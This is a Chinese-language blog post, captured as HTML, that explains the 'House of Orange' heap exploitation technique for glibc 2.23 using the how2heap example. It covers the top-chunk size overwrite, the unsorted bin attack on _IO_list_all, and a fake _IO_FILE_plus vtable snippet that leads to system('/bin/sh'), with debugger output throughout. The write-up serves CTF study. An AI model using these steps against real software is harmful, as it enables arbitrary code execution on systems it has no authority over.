@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>House_of_Orange | aYoung's Blog</title><meta name="keywords" content="ctf,pwn,heap,IO_FILE"><meta name="author" content="aYoung"><meta name="copyright" content="aYoung"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="House of Orange方法适用于glibc2.23house of orange主要分为两个部分，首先是创造出unsorted bin，然后利用unsorted bin attack修改_IO_list_all指向可控的heap，最后伪造数据FSOP getshell以下以how2heap中的house of orange为例 创造unsorted binmalloc(0x400-16)假">
+<meta property="og:type" content="article">
+<meta property="og:title" content="House_of_Orange">
+<meta property="og:url" content="https://iamayoung.xyz/2021/07/28/House-of-Orange/index.html">
+<meta property="og:site_name" content="aYoung&#39;s Blog">
+<meta property="og:description" content="House of Orange方法适用于glibc2.23house of orange主要分为两个部分，首先是创造出unsorted bin，然后利用unsorted bin attack修改_IO_list_all指向可控的heap，最后伪造数据FSOP getshell以下以how2heap中的house of orange为例 创造unsorted binmalloc(0x400-16)假">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png">
+<meta property="article:published_time" content="2021-07-28T05:45:01.000Z">
+<meta property="article:modified_time" content="2021-07-28T12:30:36.025Z">
+<meta property="article:author" content="aYoung">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta property="article:tag" content="IO_FILE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png"><link rel="shortcut icon" href="/"><link rel="canonical" href="https://iamayoung.xyz/2021/07/28/House-of-Orange/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-07-28 20:30:36'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://ftp.bmp.ovh/imgs/2020/12/e087cb4981dcab3d.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">aYoung's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">House_of_Orange</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-28T05:45:01.000Z" title="发表于 2021-07-28 13:45:01">2021-07-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-28T12:30:36.025Z" title="更新于 2021-07-28 20:30:36">2021-07-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h1><p>方法适用于glibc2.23<br>house of orange主要分为两个部分，首先是创造出unsorted bin，然后利用unsorted bin attack修改_IO_list_all指向可控的heap，最后伪造数据FSOP getshell<br>以下以how2heap中的house of orange为例</p>
+<h2 id="创造unsorted-bin"><a href="#创造unsorted-bin" class="headerlink" title="创造unsorted bin"></a>创造unsorted bin</h2><p>malloc(0x400-16)<br>假设存在溢出，修改top chunk的size<br>需要满足两个条件：Top chunk + size页对齐和pre_inuse位为1<br>示例中top chunk大小为0x20c01，修改为0xc01</p>
+<p>接下来malloc(0x1000)<br>由于此时top chunk的大小仅为0xc01<br>会调用sysmalooc，效果就是旧的top chunk被放入unsorted bin中，heap也进行了brk拓展，且紧跟在原本的top chunk之后<br><img src = 'https://i.bmp.ovh/imgs/2021/07/c3b6116fad4de0af.png' /></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x602000</span>           <span class="number">0</span>x<span class="number">623000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>     <span class="meta"> [heap]</span></span><br></pre></td></tr></table></figure>
+<p>拓展后如下</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x602000</span>           <span class="number">0</span>x<span class="number">645000</span> rw-p    <span class="number">43000</span> <span class="number">0</span>     <span class="meta"> [heap]</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>修改unsorted bin的bk指向_IO_list_all-0x10<br>并修改old top chunk的size为0x61（small bin，为了与之后对_IO_FILE利用中的偏移对应）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Free</span> chunk (unsortedbin) | PREV_INUSE</span><br><span class="line"><span class="attribute">Addr</span>: <span class="number">0</span>x<span class="number">602400</span></span><br><span class="line"><span class="attribute">Size</span>: <span class="number">0</span>xbe<span class="number">1</span></span><br><span class="line"><span class="attribute">fd</span>: <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>dd<span class="number">1</span>b<span class="number">78</span></span><br><span class="line"><span class="attribute">bk</span>: <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>dd<span class="number">2510</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pwndbg</span>&gt; x/<span class="number">10</span>gx <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>dd<span class="number">2510</span></span><br><span class="line"><span class="attribute">0x7ffff7dd2510</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x7ffff7dd2520</span> &lt;_IO_list_all&gt;:	<span class="number">0</span>x<span class="number">00007</span>ffff<span class="number">7</span>dd<span class="number">2540</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>这样一来，最后malloc时会遍历到unsorted bin，发现该chunk不符合大小，于是将该chunk从unsorted bin链中取出，此时执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
+<p>进行解链操作，自然就会在bck的fd处填上unsorted_chunks (av)，所以这一步后_IO_list_all会写上0x7ffff7dd1b78（main_arena+88）</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pwndbg</span>&gt; x/<span class="number">20</span>gx <span class="number">0</span>x<span class="number">7</span>ffff<span class="number">7</span>dd<span class="number">2510</span></span><br><span class="line"><span class="attribute">0x7ffff7dd2510</span>:	<span class="number">0</span>x<span class="number">0000000000000000</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br><span class="line"><span class="attribute">0x7ffff7dd2520</span> &lt;_IO_list_all&gt;:	<span class="number">0</span>x<span class="number">00007</span>ffff<span class="number">7</span>dd<span class="number">1</span>b<span class="number">78</span>	<span class="number">0</span>x<span class="number">0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p>并且old top chunk从unsorted bin中取出，因为size被改为0x61，介于90~98，被放入small bin[4]<br>另外在old top chunk数据区开始处写上”/bin/sh”，方便接下来_IO_FILE的利用<br><img src = 'https://i.bmp.ovh/imgs/2021/07/e328c3c4c52a7ce8.png' /></p>
+<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><h3 id="伪造-IO-FILE-plus"><a href="#伪造-IO-FILE-plus" class="headerlink" title="伪造_IO_FILE_plus"></a>伪造_IO_FILE_plus</h3><p>现在_IO_list_all已经指向了0x00007ffff7dd1b78<br>作为结构体查看此处内存<br><img src="https://z3.ax1x.com/2021/07/26/WhMXc9.png" /></p>
+<p>这里与上文中修改old top chunk的size为0x61对应，由于old top chunk被放入smallbin[4]中，从而对应_IO_FILE_plus结构体中_chain的偏移，知道_chain链接着FILE，可以看到_chain指向0x602400，正是old top chunk。所以程序会把old top chunk当作下一个_IO_FILE_plus结构体，在这里布置数据即可。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = (FILE *) top;</span><br><span class="line">fp-&gt;_mode = <span class="number">0</span>; <span class="comment">// top+0xc0</span></span><br><span class="line">fp-&gt;_IO_write_base = (<span class="keyword">char</span> *) <span class="number">2</span>; <span class="comment">// top+0x20</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (<span class="keyword">char</span> *) <span class="number">3</span>; <span class="comment">// top+0x28</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;<span class="comment">//fake _IO_OVERFLOW</span></span><br><span class="line">*(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8 set fake vtable</span></span><br></pre></td></tr></table></figure>
+<p>修改_mode为0，_IO_write_base为2，_IO_write_ptr为3绕过检查<br>并在对应vtable处（偏移0xd8）写入可控内存的地址（这里为&amp;top[12]）<br>再在vtable中偏移0x18处的_overflow处写入winner函数地址</p>
+<p>布置好后如下图所示<br><img src = 'https://i.bmp.ovh/imgs/2021/07/4ffcb883a37b2a45.png' /></p>
+<img src = 'https://i.bmp.ovh/imgs/2021/07/a5f7c4a9201bbe4c.png' />
+
+<img src = 'https://i.bmp.ovh/imgs/2021/07/234b9c978ba439ca.png' />
+
+<h3 id="触发-IO-overflow"><a href="#触发-IO-overflow" class="headerlink" title="触发_IO_overflow"></a>触发_IO_overflow</h3><p>malloc(10)<br>首先遍历到unsorted bin，执行上文所述的unsorted bin解链造成unsorted bin attack，并将原本位于unsorted bin中的old top chunk放入对应大小的small bin中（smallbin[4]）<br>然后malloc还会检查size域，检测到size小于MINSIZE<code>size &lt;= 2 * SIZE_SZ</code>，触发终止调用链执行最终getshell</p>
+<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">pwndbg</span>&gt; <span class="selector-tag">backtrace</span></span><br><span class="line"><span class="selector-id">#0</span>  <span class="selector-tag">_IO_flush_all_lockp</span> (do_lock=do_lock<span class="variable">@entry</span>=<span class="number">0</span>) <span class="selector-tag">at</span> <span class="selector-tag">genops</span><span class="selector-class">.c</span><span class="selector-pseudo">:760</span></span><br><span class="line"><span class="selector-id">#1</span>  <span class="selector-tag">0x00007ffff7a43fcd</span> <span class="selector-tag">in</span> <span class="selector-tag">__GI_abort</span> () <span class="selector-tag">at</span> <span class="selector-tag">abort</span><span class="selector-class">.c</span><span class="selector-pseudo">:74</span></span><br><span class="line"><span class="selector-id">#2</span>  <span class="selector-tag">0x00007ffff7a847fa</span> <span class="selector-tag">in</span> <span class="selector-tag">__libc_message</span> (do_abort=<span class="number">2</span>, fmt=fmt<span class="variable">@entry</span>=<span class="number">0</span>x7ffff7b9dfd8 <span class="string">&quot;*** Error in `%s&#x27;: %s: 0x%s ***\n&quot;</span>) <span class="selector-tag">at</span> ../<span class="selector-tag">sysdeps</span>/<span class="selector-tag">posix</span>/<span class="selector-tag">libc_fatal</span><span class="selector-class">.c</span><span class="selector-pseudo">:175</span></span><br><span class="line"><span class="selector-id">#3</span>  <span class="selector-tag">0x00007ffff7a8f15e</span> <span class="selector-tag">in</span> <span class="selector-tag">malloc_printerr</span> (ar_ptr=<span class="number">0</span>x7ffff7dd1b20 &lt;main_arena&gt;, ptr=<span class="number">0</span>x7ffff7dd2520 &lt;_IO_list_all&gt;, str=<span class="number">0</span>x7ffff7b9ae3f <span class="string">&quot;malloc(): memory corruption&quot;</span>, action=&lt;optimized out&gt;) <span class="selector-tag">at</span> <span class="selector-tag">malloc</span><span class="selector-class">.c</span><span class="selector-pseudo">:5020</span></span><br><span class="line"><span class="selector-id">#4</span>  <span class="selector-tag">_int_malloc</span> (av=av<span class="variable">@entry</span>=<span class="number">0</span>x7ffff7dd1b20 &lt;main_arena&gt;, bytes=bytes<span class="variable">@entry</span>=<span class="number">10</span>) <span class="selector-tag">at</span> <span class="selector-tag">malloc</span><span class="selector-class">.c</span><span class="selector-pseudo">:3481</span></span><br><span class="line"><span class="selector-id">#5</span>  <span class="selector-tag">0x00007ffff7a911d4</span> <span class="selector-tag">in</span> <span class="selector-tag">__GI___libc_malloc</span> (bytes=<span class="number">10</span>) <span class="selector-tag">at</span> <span class="selector-tag">malloc</span><span class="selector-class">.c</span><span class="selector-pseudo">:2920</span></span><br><span class="line"><span class="selector-id">#6</span>  <span class="selector-tag">0x00000000004007d8</span> <span class="selector-tag">in</span> <span class="selector-tag">main</span> () <span class="selector-tag">at</span> <span class="selector-tag">glibc_2</span><span class="selector-class">.23</span>/<span class="selector-tag">house_of_orange</span><span class="selector-class">.c</span><span class="selector-pseudo">:257</span></span><br><span class="line"><span class="selector-id">#7</span>  <span class="selector-tag">0x00007ffff7a2d840</span> <span class="selector-tag">in</span> <span class="selector-tag">__libc_start_main</span> (main=<span class="number">0</span>x4006a6 &lt;main&gt;, argc=<span class="number">1</span>, argv=<span class="number">0</span>x7fffffffdda8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0</span>x7fffffffdd98) <span class="selector-tag">at</span> ../<span class="selector-tag">csu</span>/<span class="selector-tag">libc-start</span><span class="selector-class">.c</span><span class="selector-pseudo">:291</span></span><br><span class="line"><span class="selector-id">#8</span>  <span class="selector-tag">0x00000000004005d9</span> <span class="selector-tag">in</span> <span class="selector-tag">_start</span> ()</span><br></pre></td></tr></table></figure>
+<p>malloc_printerr函数调用链如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_int_malloc-&gt;malloc_printerr-&gt;__libc_message-&gt;__GI_abort-&gt;_IO_flush_all_lockp-&gt;_IO_OVERFLOW</span><br></pre></td></tr></table></figure>
+
+<p>最终跳转进入winnner函数，调用system(“/bin/sh”)getshell<br><img src = 'https://i.bmp.ovh/imgs/2021/07/396012598b3e8796.png' /></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>house of orange整体由三部分组成</p>
+<ol>
+<li>没有free的情况下通过修改top chunk的size位（需要注意页对齐和pre_inuse位为1），利用sysmalloc创造出unsorted bin</li>
+<li>利用unsorted bin attack修改_IO_list_all指向main_arena+88，并修改old top chunk的size为0x61(97)，从而放入smallbin[4](90~98)。则造成在main_arena+88+0x68处，对应_IO_FILE_plus中的_chain指向old top chunk</li>
+<li>FSOP，布置old top chunk（fake _IO_FILE_plus）中的数据和指针，布置fake _IO_FILE中的_mode，_IO_write_base，_IO_write_ptr。写入fake vtable指向可控的内存区域，在对应偏移0x18写入fake _overflow指向winner函数最终执行了system(“/bin/sh”)。<br>如果在fake _overflow处写入system函数地址，则最终会执行_IO_flush_all_lockp在调用_overflow(fp, EOF)时，fp指向”/bin/sh”，也能getshell</li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">aYoung</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://iamayoung.xyz/2021/07/28/House-of-Orange/">https://iamayoung.xyz/2021/07/28/House-of-Orange/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://iamayoung.xyz" target="_blank">aYoung's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/pwn/">pwn</a><a class="post-meta__tags" href="/tags/heap/">heap</a><a class="post-meta__tags" href="/tags/IO-FILE/">IO_FILE</a></div><div class="post_share"><div class="social-share" data-image="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/07/26/FSOP/"><img class="next-cover" src="https://ftp.bmp.ovh/imgs/2021/06/373b822d88c4973e.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">FSOP</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/07/14/House-of-Rabbit/" title="House_of_Rabbit"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-14</div><div class="title">House_of_Rabbit</div></div></a></div><div><a href="/2021/07/26/FSOP/" title="FSOP"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/06/373b822d88c4973e.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-26</div><div class="title">FSOP</div></div></a></div><div><a href="/2020/11/20/CPU工作/" title="PWN入门之cpu工作原理"><img class="cover" src="https://ftp.bmp.ovh/imgs/2020/12/d91e03ffbfd03bc3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-11-20</div><div class="title">PWN入门之cpu工作原理</div></div></a></div><div><a href="/2021/01/15/SROP/" title="SROP"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/01/49048d5e4aae8e59.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-15</div><div class="title">SROP</div></div></a></div><div><a href="/2020/12/15/PLT&GOT/" title="延迟绑定与PLT&GOT"><img class="cover" src="https://ftp.bmp.ovh/imgs/2020/12/d06b6b66268e2e62.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-12-15</div><div class="title">延迟绑定与PLT&GOT</div></div></a></div><div><a href="/2021/03/16/Stack-smash/" title="Stack-smash"><img class="cover" src="https://ftp.bmp.ovh/imgs/2021/03/efa0723f1559e567.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-16</div><div class="title">Stack-smash</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://ftp.bmp.ovh/imgs/2020/12/e087cb4981dcab3d.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">aYoung</div><div class="author-info__description">aYoung的博客</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">51</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/aYoung-CS"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/aYoung-CS" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">好好学习</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#House-of-Orange"><span class="toc-number">1.</span> <span class="toc-text">House of Orange</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9B%E9%80%A0unsorted-bin"><span class="toc-number">1.1.</span> <span class="toc-text">创造unsorted bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unsorted-bin-attack"><span class="toc-number">1.2.</span> <span class="toc-text">unsorted bin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FSOP"><span class="toc-number">1.3.</span> <span class="toc-text">FSOP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-IO-FILE-plus"><span class="toc-number">1.3.1.</span> <span class="toc-text">伪造_IO_FILE_plus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91-IO-overflow"><span class="toc-number">1.3.2.</span> <span class="toc-text">触发_IO_overflow</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text">总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/07/28/House-of-Orange/" title="House_of_Orange"><img src="https://ftp.bmp.ovh/imgs/2021/07/4240c846ca572854.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="House_of_Orange"/></a><div class="content"><a class="title" href="/2021/07/28/House-of-Orange/" title="House_of_Orange">House_of_Orange</a><time datetime="2021-07-28T05:45:01.000Z" title="发表于 2021-07-28 13:45:01">2021-07-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/26/FSOP/" title="FSOP"><img src="https://ftp.bmp.ovh/imgs/2021/06/373b822d88c4973e.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="FSOP"/></a><div class="content"><a class="title" href="/2021/07/26/FSOP/" title="FSOP">FSOP</a><time datetime="2021-07-26T09:32:32.000Z" title="发表于 2021-07-26 17:32:32">2021-07-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/07/25/%E5%88%9D%E8%AF%86IO-FILE/" title="初识IO-FILE"><img 